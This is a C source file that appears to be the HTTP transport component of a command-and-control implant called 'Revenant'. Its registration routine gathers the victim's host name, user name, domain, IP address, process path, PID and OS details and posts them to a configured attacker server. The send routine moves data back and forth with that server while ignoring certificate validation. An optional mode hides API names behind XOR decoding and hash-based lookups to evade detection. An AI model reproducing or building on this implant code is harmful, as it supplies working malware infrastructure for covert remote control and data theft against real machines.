#include "Defs.h"
#include "Core.h"
#include "Poly.h"
#include "Config.h"
#include "Command.h"
#include "Revenant.h"
#include "Transport.h"
#include "Utilities.h"
#include "Obfuscation.h"

#include <iptypes.h>
#include <iphlpapi.h>
#include <winhttp.h>

#define DATA_FREE( d, l ) \
    mem_set( d, 0, l ); \
    LocalFree( d ); \
    d = NULL;

BOOL TransportInit( ) {
    PPACKAGE         Package    = NULL;
    BOOL             Success    = FALSE;
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;

    Package = PackageCreate( COMMAND_REGISTER );

    // Add data
    /*
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
    */

    // Add AES Keys/IV
    // PackageAddPad( Package, Instance.Config.AES.Key, 32 );
    // PackageAddPad( Package, Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( Package, Instance.Session.AgentID );

#if CONFIG_OBFUSCATION == TRUE
    // Get Computer name
    unsigned char s_kernel32[] = S_KERNEL32;
    unsigned char s_advapi32[] = S_ADVAPI32;
    unsigned char s_iphlpapi[] = S_IPHLPAPI;
    unsigned char s_xkey[] = S_XK;
    unsigned char d_kernel32[14] = {0};
    unsigned char d_advapi32[14] = {0};
    unsigned char d_iphlpapi[14] = {0};

    xor_dec((char *)s_kernel32, sizeof(s_kernel32), (char *)s_xkey, sizeof(s_xkey));
    mem_cpy(d_kernel32,s_kernel32,12);

    xor_dec((char *)s_advapi32, sizeof(s_advapi32), (char *)s_xkey, sizeof(s_xkey));
    mem_cpy(d_advapi32,s_advapi32,12);

    xor_dec((char *)s_iphlpapi, sizeof(s_iphlpapi), (char *)s_xkey, sizeof(s_xkey));
    mem_cpy(d_iphlpapi,s_iphlpapi,12);

    HANDLE p_kernel32 = GetModuleHandle(d_kernel32);
    HANDLE p_advapi32 = LoadLibrary(d_advapi32);
    HANDLE p_iphlpapi = LoadLibrary(d_iphlpapi);

    GetComputerNameExA_t p_GetComputerNameExA = (GetComputerNameExA_t) GetProcAddressByHash(p_kernel32,
                                                                                            GetComputerNameExA_CRC32B);
    if ( ! p_GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
    }

    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    GetUserNameA_t p_GetUserNameA = (GetUserNameA_t) GetProcAddressByHash(p_advapi32, GetUserNameA_CRC32B);

    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
        p_GetUserNameA(Data, (LPDWORD) &Length);
    }

    PackageAddBytes( Package, Data, strlen( Data ) );
    DATA_FREE( Data, Length );

    // Get Domain
    if ( ! p_GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    GetAdaptersInfo_t p_GetAdaptersInfo = (GetAdaptersInfo_t) GetProcAddressByHash(p_iphlpapi, GetAdaptersInfo_CRC32B);

    p_GetAdaptersInfo(NULL, (PULONG) &Length);
    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
        if (p_GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );

            mem_set( Adapter, 0, Length );
            LocalFree( Adapter );
            Adapter = NULL;
        }
        else
            PackageAddInt32( Package, 0 );
    }
    else {
        PackageAddInt32(Package, 0);
    }

    GetModuleFileNameA_t p_GetModuleFileNameA = (GetModuleFileNameA_t) GetProcAddressByHash(p_kernel32,
                                                                                            GetModuleFileNameA_CRC32B);

    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
    {
        Length = p_GetModuleFileNameA( NULL, Data, Length );
        PackageAddBytes( Package, Data, Length );
    } else {
        PackageAddInt32( Package, 0 );
    }

    GetCurrentProcessId_t p_GetCurrentProcessId = (GetCurrentProcessId_t) GetProcAddressByHash(p_kernel32,
                                                                                               GetCurrentProcessId_CRC32B);
    PackageAddInt32( Package, p_GetCurrentProcessId() );

    FreeLibrary(p_advapi32);
    FreeLibrary(p_iphlpapi);

#else
    // Get Computer name
    if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
    }

    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
        GetUserNameA(Data, (LPDWORD) &Length);
    }

    PackageAddBytes( Package, Data, strlen( Data ) );
    DATA_FREE( Data, Length );

    // Get Domain
    if ( ! GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    GetAdaptersInfo(NULL, (PULONG) &Length);
    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
        if (GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );

            mem_set( Adapter, 0, Length );
            LocalFree( Adapter );
            Adapter = NULL;
        }
        else
            PackageAddInt32( Package, 0 );
    }
    else {
        PackageAddInt32(Package, 0);
    }
    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
    {
        Length = GetModuleFileNameA( NULL, Data, Length );
        PackageAddBytes( Package, Data, Length );
    } else {
        PackageAddInt32( Package, 0 );
    }

    PackageAddInt32( Package, GetCurrentProcessId() );
#endif


    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, PROCESS_AGENT_ARCH );
    PackageAddInt32( Package, FALSE ); // default

    mem_set( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );

    PackageAddInt32( Package, OsVersions.dwMajorVersion );
    PackageAddInt32( Package, OsVersions.dwMinorVersion );
    PackageAddInt32( Package, OsVersions.wProductType );
    PackageAddInt32( Package, OsVersions.wServicePackMajor );
    PackageAddInt32( Package, OsVersions.dwBuildNumber );

    PackageAddInt32( Package, Instance.Session.OSArch );
    PackageAddInt32( Package, Instance.Config.Sleeping );
    // End of Options

    if ( PackageTransmit( Package, &Data, &Length ) ){
        // PRINT_HEX( Data, (int)Length )

        if ( Data ){
            // _tprintf( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) ){
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
        else {
            Success = FALSE;
        }
    }


    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize ) {
    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;

    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = TRUE;

#if CONFIG_OBFUSCATION == TRUE
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_WINHTTP;
    char * winhttp = xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));

    winhttp[7] = 0x00;

    WinHttpOpen_t pWinHttpOpen  = (WinHttpOpen_t) GetProcAddressByHash(GetModuleHandle(winhttp), WinHttpOpen_CRC32B);
    hSession = pWinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );

#else
    hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
#endif
    if ( ! hSession )
    {
        // _tprintf( "WinHttpOpen: Failed => %d\n", GetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }
#if CONFIG_OBFUSCATION == TRUE
    WinHttpConnect_t pWinHttpConnect  = (WinHttpConnect_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                WinHttpConnect_CRC32B);
    hConnect = pWinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
    WinHttpCloseHandle_t pWinHttpCloseHandle;
#else
    hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
#endif

    if ( ! hConnect )
    {
        // _tprintf( "WinHttpConnect: Failed => %d\n", GetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    HttpEndpoint = L"index.php";
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

#if CONFIG_OBFUSCATION == TRUE
    WinHttpOpenRequest_t pWinHttpOpenRequest  = (WinHttpOpenRequest_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                            WinHttpOpenRequest_CRC32B);
    hRequest = pWinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );

#else
    hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
#endif

    if ( ! hRequest )
    {
        // _tprintf( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
        return FALSE;
    }

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            asm("nop");
            // _tprintf( "WinHttpSetOption: Failed => %d\n", GetLastError() );
        }
    }




#if CONFIG_OBFUSCATION == TRUE
    WinHttpSendRequest_t pWinHttpSendRequest  = (WinHttpSendRequest_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                            WinHttpSendRequest_CRC32B);
    // Send our data
    if ( pWinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
    {
#else
    // Send our data
    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
    {
#endif

#if CONFIG_OBFUSCATION == TRUE
        WinHttpReceiveResponse_t pWinHttpReceiveResponse  = (WinHttpReceiveResponse_t) GetProcAddressByHash(
                GetModuleHandle(winhttp), WinHttpReceiveResponse_CRC32B);
        if ( RecvData && pWinHttpReceiveResponse( hRequest, NULL ) )
        {
#else
            if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
        {
#endif
            RespBuffer = NULL;
            do
            {
#if CONFIG_OBFUSCATION == TRUE
                WinHttpReadData_t pWinHttpReadData  = (WinHttpReadData_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                               WinHttpReadData_CRC32B);
                Successful = pWinHttpReadData( hRequest, Buffer, 1024, &BufRead );

#else
                Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
#endif

                if ( ! Successful || BufRead == 0 )
                {
                    if ( ! Successful ) {
                        asm("nop");
                        // _tprintf( "WinHttpReadData: Failed (%d)\n", GetLastError() );
                    }
                    break;
                }

                if ( ! RespBuffer ) {
                    RespBuffer = LocalAlloc(LPTR, BufRead);
                }else {
                    RespBuffer = LocalReAlloc(RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
                }
                RespSize += BufRead;

                mem_cpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                mem_set( Buffer, 0, 1024 );

            } while ( Successful == TRUE );

            if ( RecvSize ) {
                *RecvSize = RespSize;
            }

            if ( RecvData ) {
                *RecvData = RespBuffer;
            }
            Successful = TRUE;
        }
    }
    else
    {
        if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;
        }
        else {
            // _tprintf( "WinHttpSendRequest: Failed => %d\n", GetLastError() );
        }
        Successful = FALSE;
        goto LEAVE;
    }


    LEAVE:

#if CONFIG_OBFUSCATION == TRUE

    pWinHttpCloseHandle = (WinHttpCloseHandle_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                      WinHttpCloseHandle_CRC32B);

    pWinHttpCloseHandle ( hSession );
    pWinHttpCloseHandle ( hConnect );
    pWinHttpCloseHandle ( hRequest );

#else
    WinHttpCloseHandle( hSession );
    WinHttpCloseHandle( hConnect );
    WinHttpCloseHandle( hRequest );
#endif


    return Successful;
}